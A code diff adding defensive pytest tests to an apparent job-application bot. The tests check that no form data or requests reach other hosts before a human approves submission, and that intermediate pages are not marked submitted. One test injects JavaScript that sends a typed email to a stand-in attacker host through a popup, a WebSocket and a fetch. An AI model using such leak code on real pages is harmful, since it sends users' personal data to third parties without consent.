@@ -437,3 +437,132 @@ def test_changed_answer_after_approval_is_refused(ctx, make_job, server):
     with pytest.raises(ApprovalError, match="changed after approval"):
         service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
     assert server.posts == [] and repo.get_approval(ctx.db, approval_uid)["status"] == "approved"
+
+
+# --------------------------------------------------------------------------- #
+# SEC-1: nothing leaves the browser before the approved click
+# --------------------------------------------------------------------------- #
+def default_factory_fast(options: BrowserOptions) -> PlaywrightBrowser:
+    """The production default (third-party GETs allowed until filling begins)."""
+    return PlaywrightBrowser(replace(options, block_third_party_requests=False))
+
+
+@pytest.mark.parametrize("factory", [offline_factory, default_factory_fast], ids=["strict", "default"])
+def test_prepare_sends_nothing_before_approval(ctx, make_job, server, attacker, factory):
+    """Hostile autosave page: same-host fetch/PUT/beacon, a real form post into a hidden iframe,
+    beacons / fetch / pixels / WebSockets / iframes to another host and another port."""
+    _profile_with_answers(ctx)
+    info = _setup(ctx, make_job, server.url("/forms/leaky_form.html"))
+    result = service.prepare_application(ctx, info["job_uid"], browser_factory=factory)
+    assert result.status == S.AWAITING_APPROVAL, result.message
+    assert result.filled >= 5  # it did fill the form (and so fired every leak handler)
+    assert repo.get_approval(ctx.db, result.approval_uid)["status"] == "pending"
+    # ZERO non-GET requests reached the official host: no autosave, no iframe form post.
+    assert server.non_get() == [] and server.posts == []
+    assert not any("autosave" in path for _, path in server.requests)
+    # Nothing typed reached the attacker. In the default mode the page could load its third-party
+    # logo *before* filling began; nothing after that.
+    expected = [] if factory is offline_factory else [("GET", f"localhost:{attacker.port}", "/static/logo.png")]
+    assert attacker.hits == expected
+    assert not any(b"test.candidate" in body or b"fixture resume" in body for _, body in server.posts)
+
+
+def test_popups_and_new_windows_never_reach_anyone(ctx, make_job, server, attacker):
+    info = _setup(ctx, make_job, server.url("/forms/popup_form.html"))
+    result = service.prepare_application(ctx, info["job_uid"], browser_factory=default_factory_fast)
+    assert result.status == S.NEEDS_MANUAL_ACTION and "new window" in result.message
+    assert attacker.hits == [] and server.non_get() == []
+
+
+def test_session_guard_blocks_popups_websockets_and_iframes(server, attacker):
+    """Session level (cf. review repro): popup, WebSocket, fetch, iframe and pixel after filling began."""
+    port = attacker.port
+    url = server.url("/forms/leaky_form.html?iframe=0")
+    policy = NavigationPolicy.for_job(job_url=url, application_url=None)
+    with PlaywrightBrowser(BrowserOptions(timeout_seconds=10)) as browser:
+        page = browser.open_application(url, policy)
+        fields = {f.key: f for f in page.inspect_form()}
+        page.fill(fields["email"], "jane.doe@example.com")
+        page.raw_page.evaluate(f"""() => {{
+            window.open('http://localhost:{port}/popup?e=jane');
+            try {{ new WebSocket('ws://127.0.0.1:{port}/ws-direct?e=jane'); }} catch (e) {{}}
+            fetch('http://127.0.0.1:{port}/fetch-get?e=jane', {{mode: 'no-cors'}}).catch(() => {{}});
+        }}""")
+        page.raw_page.locator("#email").blur()
+        page.wait(1.5)
+        with pytest.raises(NavigationBlocked, match="new window"):
+            page.check_navigation()
+    assert attacker.hits == [("GET", f"localhost:{port}", "/static/logo.png")]  # before filling only
+    assert server.non_get() == []
+    blocked = page.blocked_requests
+    kinds = {method for method, _, _ in blocked}
+    assert {"WEBSOCKET", "POST", "PUT", "GET"} <= kinds
+    assert all("?" not in u for _, u, _ in blocked)  # typed data (query strings) is never logged
+
+
+def test_armed_submission_posts_once_and_only_to_the_official_host(ctx, make_job, server, attacker):
+    info, approval_uid = _approve_simple(ctx, make_job, server, "confirm", page="leaky_form.html",
+                                         factory=default_factory_fast)
+    attacker.hits.clear()
+    result = service.submit_approved(ctx, approval_uid, browser_factory=default_factory_fast)
+    assert result.outcome == "submitted" and result.status == S.SUBMITTED, result.message
+    # Re-filling fired every leak handler again: still no autosave; exactly the one approved post.
+    assert server.non_get() == [("POST", "/submit/confirm")]
+    assert b"%PDF-1.4 fixture resume" in server.posts[0][1]
+    assert attacker.hits == [("GET", f"localhost:{attacker.port}", "/static/logo.png")]
+
+
+def test_xhr_submission_is_allowed_only_after_the_approved_click(ctx, make_job, server, attacker):
+    info, approval_uid = _approve_simple(ctx, make_job, server, "xhr", page="xhr_submit_form.html")
+    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
+    assert result.outcome == "submitted" and result.status == S.SUBMITTED, result.message
+    assert server.non_get() == [("POST", "/submit/xhr")]
+    assert "Application submitted" in result.evidence["matched_text"]
+    assert attacker.hits == []  # the submit-time beacon to another host stayed blocked while armed
+
+
+# --------------------------------------------------------------------------- #
+# C5: intermediate pages are never recorded as submitted
+# --------------------------------------------------------------------------- #
+def test_review_step_at_apply_confirm_is_unknown_not_submitted(ctx, make_job, server):
+    info, approval_uid = _approve_simple(ctx, make_job, server, "review")
+    ctx.config.applications.browser_timeout_seconds = 3
+    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
+    assert result.outcome == "unknown" and result.status == S.NEEDS_MANUAL_ACTION, result.message
+    assert "intermediate / review step" in result.message
+    assert server.non_get() == [("POST", "/submit/review")]
+    app = repo.get_application(ctx.db, info["app_id"])
+    assert app["status"] == S.NEEDS_MANUAL_ACTION.value and app["confirmation_status"] != "page_evidence"
+    assert ctx.db.scalar("SELECT COUNT(*) FROM errors WHERE application_id = ? AND error_kind = 'unknown_outcome'",
+                         (info["app_id"],)) == 1
+
+
+def test_screening_step_with_validation_error_is_not_submitted(ctx, make_job, server):
+    info, approval_uid = _approve_simple(ctx, make_job, server, "screening")
+    ctx.config.applications.browser_timeout_seconds = 3
+    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
+    assert result.status != S.SUBMITTED and result.outcome == "failed", result.message
+    assert any("required" in e for e in result.validation_errors)
+    assert server.non_get() == [("POST", "/submit/screening")]
+
+
+def test_wizard_with_only_a_continue_button_is_never_clicked(ctx, make_job, server):
+    info, approval_uid = _approve_simple(ctx, make_job, server, "confirm", page="wizard_continue.html")
+    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
+    assert result.outcome == "not_submitted" and result.status == S.NEEDS_MANUAL_ACTION
+    assert "no submit button" in result.message
+    assert server.non_get() == [] and repo.get_approval(ctx.db, approval_uid)["status"] == "approved"
+
+
+def test_find_submit_accepts_only_final_submit_labels(server):
+    url = server.url("/forms/wizard_continue.html")
+    with offline_factory(BrowserOptions(timeout_seconds=10)) as browser:
+        page = browser.open_application(url, NavigationPolicy.for_job(job_url=url, application_url=None))
+        assert page.find_submit() is None
+        page.raw_page.evaluate("() => { document.querySelector('#continue-btn').textContent = 'Submit'; }")
+        assert page.find_submit().text == "Submit"
+    gh = server.url("/forms/greenhouse_like.html")
+    with offline_factory(BrowserOptions(timeout_seconds=10)) as browser:
+        page = browser.open_application(gh, NavigationPolicy.for_job(job_url=gh, application_url=None))
+        assert page.find_submit().text == "Submit Application"
+    assert server.non_get() == []
